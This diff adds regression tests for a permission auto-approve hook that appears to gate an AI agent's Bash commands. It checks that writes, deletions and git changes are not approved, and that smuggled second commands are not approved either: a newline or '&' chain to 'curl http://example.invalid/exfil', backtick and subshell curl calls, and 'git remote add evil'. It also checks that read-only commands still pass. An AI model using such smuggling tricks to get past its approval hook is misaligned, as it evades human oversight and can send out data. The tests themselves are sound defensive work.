@@ -590,6 +590,82 @@ assert_output_not_contains "does not approve curl" '"allow"' "$OUTPUT"
 OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"npm install express"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
 assert_output_not_contains "does not approve npm install" '"allow"' "$OUTPUT"
 
+# --- permission-auto-approve writes-through-the-whitelist hardening (SPEC-340) ---
+# Group (a): must-not-approve. Each of these matched an "allow" branch before the fix even
+# though it writes a file, mutates git state, or smuggles a second command past the whitelist.
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"echo x >/tmp/paa-test-f"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve unspaced redirect (echo x >/tmp/f)" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"find /tmp -name *.tmp -delete"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve find -name with -delete" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"find /tmp -name *.tmp -exec rm {} \\;"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve find -name with -exec" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git log --output=/tmp/paa-test-log"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve git log --output" '"allow"' "$OUTPUT"
+
+OUTPUT=$(printf '%s\n%s' 'git status' 'curl -s http://example.invalid/exfil' | jq -Rs '{"tool_name":"Bash","tool_input":{"command":.}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve a two-line command whose first line alone is safe" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"ls & curl http://example.invalid/exfil"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve a single & background chain" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cat </etc/hosts"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve a bare < redirect" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git branch newbranch"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve git branch <name> (creates a branch)" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git tag v9.9.9"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve git tag <name> (creates a tag)" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git remote add evil http://example.invalid/repo.git"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve git remote add" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"echo `curl http://example.invalid`"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve a bare backtick substitution" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"(curl http://example.invalid)"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve a bare-parenthesis subshell" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"sed -i s/a/b/ /tmp/paa-test-f"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve sed -i (never on the allowlist)" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"sort -o /tmp/paa-test-f /tmp/paa-test-f"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_not_contains "does not approve sort -o (never on the allowlist)" '"allow"' "$OUTPUT"
+
+# Group (b): must-still-approve. Guards against "fixed by turning every read into a prompt."
+# git status / git log --oneline -5 / ls -la are already asserted above; not repeated here.
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cat README.md"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves cat README.md" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"find . -name *.md"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves find . -name *.md" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git diff --stat"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves git diff --stat" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git branch -v"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves git branch -v" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git remote -v"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves git remote -v" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git tag -l"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves git tag -l" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"npm list"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves npm list" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"pwd"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves bare pwd" '"allow"' "$OUTPUT"
+
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"env"}}' | bash "$KIT_DIR/hooks/permission-auto-approve.sh" 2>/dev/null)
+assert_output_contains "still approves bare env" '"allow"' "$OUTPUT"
+
 # ============================================================
 echo ""
 echo "=== auto-format.sh ==="
